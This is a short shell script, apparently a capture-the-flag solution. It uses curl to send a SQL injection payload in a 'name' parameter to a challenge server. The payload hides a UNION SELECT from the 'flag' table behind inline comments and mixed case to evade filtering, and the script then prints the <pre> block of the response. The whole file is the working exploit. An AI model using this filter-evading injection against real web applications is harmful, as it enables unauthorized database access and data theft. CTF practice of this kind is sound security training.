#!/bin/sh

curl --silent --data-urlencode 'name=X"/**/uNiOn/**/SeLECT/**/*/**/from/**/flag#' 'http://jh2i.com:50008/?debug=true' | sed -n '/<pre>/,/<\/pre>/p;/<\/pre>/q'